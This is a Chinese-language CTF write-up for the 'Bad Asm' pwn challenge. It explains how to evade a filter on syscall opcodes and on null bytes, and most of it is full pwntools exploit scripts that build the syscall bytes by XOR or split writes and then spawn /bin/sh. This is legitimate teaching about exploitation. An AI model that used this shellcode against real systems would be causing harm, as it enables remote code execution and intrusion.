# Bad Asm

程序过滤syscall / sysenter / int 0x80的汇编指令的机器码。

strcpy限制了shellcode的机器码中不能出现0x00。

开启的可执行的段具有写的权限，用异或搓出来syscall的机器码之后用mov写入到shellcode后面，中间用nop连接一下就行了。

由于程序清空了rsp rbp寄存器，我们需要恢复一下rsp的值，任意一个可读写的段即可，否则push操作会寄掉。

可以用异或先把syscall的机器码插入到当前shellcode的后面来执行read的syscall，利用read在旧的shellcode后面插入execve("/bin/sh",0,0)的shellcode，第二次输入的payload中0x42个a的作用是覆盖掉老的shellcode，毕竟执行过了也没用了。

恢复rsp的作用是为了能够正常执行push/pop指令，这里push/pop指令位于shellcraft.sh()生成的shellcode中。否则其生成的shellcode无法正常执行。

```Python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import*
from Crypto.Util.number import long_to_bytes,bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=remote('???.???.???.???',?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
;// 目标 : 使用syscall执行read(0,code,0x3fff)
mov rsp, rdi
mov rax,rdi
add sp, 0x0848  ;//从开头到这里的作用是给rsp一个合法值，使push/pop指令能够正常执行。同时设置rax的值方便后面往当前shellcode末尾拼接上syscall指令的机器码。

mov rsi,rdi
mov dx,0x3fff ;//这两行作用是设置rsi、rdx寄存器

mov cx,0x454f
xor cx,0x4040 ;//这两行作用是用异或搓出来 0f 05 (syscall的机器码)
add al,0x40
mov [rax],cx  ;//rax原本指向的是当前段的开始位置，加上一个偏移，在之后指向的地方写入0f 05，即syscall，相当于拼接到当前shellcode后面。

xor rdi,rdi
xor rax,rax   ;//设置read的系统调用号0，设置rdi寄存器
'''
p.sendafter("Input your Code :",asm(shellcode).ljust(0x40,b'\x90')) # \x90是nop指令的机器码，用于连接上面的shellcode和写入的syscall，使程序能正常执行。

pause()
p.send(b'a'*0x42+asm(shellcraft.sh())) # 0x42个a正好覆盖了syscall，之后拼接新的shellcode会继续执行本次写入的新的shellcode
p.interactive()
```

除了异或的方法，我们可以用另一种方法布置syscall的机器码。

题目检查syscall的时候采用的方法是检测相邻两个字节，所以我们可以将两个字节分别用一个汇编指令写入到内存中，比如用mov，这样我们就可以将其机器码：0xf 0x5拆开，而不是连续的字节，这样也可以通过检查。

```Python
mov byte ptr [r8 + 0x17], 0xf
mov byte ptr [r8 + 0x18], 0x5
```

最后保证控制执行流执行到写入的0f05那里就行了。

下面的exp中直接异或搓了一个execve("/bin/sh",0,0)，这样也是可以的。

```Python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import*
from Crypto.Util.number import long_to_bytes,bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=remote('???.???.???.???',?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
;// 目标：执行execve("/bin/sh",0,0)的syscall
mov rsp, rdi
add sp, 0x0848 ;//给rsp一个合法值，使程序能正常执行push/pop，任意一个可读写段即可，我们这里刚好有rdi中存储的shellcode的段的起始位置，正好这个段有读写权限，就直接拿来在0x848偏移的位置当作栈顶了（加偏移是为了防止某些操作破坏写入的shellcode）
mov rsi,0x4028636f2e49226f
mov rdx,0x4040104040204040 
xor rsi,rdx 
push rsi ;//异或搓出来'/bin/sh\x00'(正好8字节，一个寄存器能存下)并push到栈上面。此时rsp指向的即此字符串的开始位置

mov ax,0x454f
xor ax,0x4040
mov rsi,rdi
add sil,0x40
mov [rsi],ax ;//搓出来syscall的机器码0f 05并且拼接到当前shellcode后面。

mov rdi,rsp  ;//设置rdi，指向之前push到栈上面的'/bin/sh\x00‘
xor rsi,rsi  
xor rdx,rdx  ;//设置rsi，rdx
xor rax,rax
mov al,59    ;//设置execve的系统调用号
'''    
p.sendafter("Input your Code :",asm(shellcode).ljust(0x40,b'\x90'))
p.interactive()
```

除此之外，由于我们把栈放在可执行段上面了，我们可以直接异或整出来syscall的机器码然后push到栈上面，最后jmp rsp即可。由于这种方法我们并不依赖nop指令进行连接，在送payload的时候可以去掉ljust了

```Python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import*
from Crypto.Util.number import long_to_bytes,bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=remote('???.???.???.???',?????)

# p=process(ELFpath)
# gdb.attach(p)

shellcode='''
;// 目标：执行execve("/bin/sh",0,0)的syscall
mov rsp, rdi
add sp, 0x0848 ;//给rsp一个合法值，使程序能正常执行push/pop
mov rsi,0x4028636f2e49226f
mov rdx,0x4040104040204040 
xor rsi,rdx 
push rsi ;//异或搓出来'/bin/sh\x00'并push到栈上面。此时rsp指向的即此字符串的开始位置

mov rdi,rsp  ;//设置rdi，指向之前push到栈上面的'/bin/sh\x00‘
xor rsi,rsi  
xor rdx,rdx  ;// 设置rsi，rdx
xor rax,rax
mov al,59    ;//设置execve的系统调用号

mov cx,0xf5ff
xor cx,0xf0f0 ;//异或拿到syscall的机器码
push rcx      ;//push到栈顶，rsp此时指向的是syscall指令
jmp rsp
'''

p.sendafter("Input your Code :",asm(shellcode))

p.interactive()
```

在把'/bin/sh\x00'push到栈上面的时候我们为了清除最后的0x00，采用了异或的方法。除了这种方法外我们可以调整一下这个字符串，比如我们可以改为使用'/bin///sh'，shellcraft.sh()生成的shellcode采用的就是这种方法。

按照这种方法更改的shellcode，也是可以拿到shell的

```Python
shellcode='''
;// 目标：执行execve("/bin///sh",0,0)的syscall
mov rsp, rdi
add sp, 0x0848 ;//给rsp一个合法值，使程序能正常执行push/pop

push 0x68
mov rax, 0x732f2f2f6e69622f
push rax ;//将'/bin///sh'push到栈上面，最后一个字符h是第6行push的，高位默认填充为0，此时就不用异或了

mov rdi,rsp  ;//设置rdi，指向之前push到栈上面的'/bin/sh\x00‘
xor rsi,rsi  
xor rdx,rdx  ;// 设置rsi，rdx
xor rax,rax
mov al,59    ;//设置execve的系统调用号

mov cx,0xf5ff
xor cx,0xf0f0 ;//异或拿到syscall的机器码
push rcx      ;//push到栈顶，rsp此时指向的是syscall指令
jmp rsp
'''
```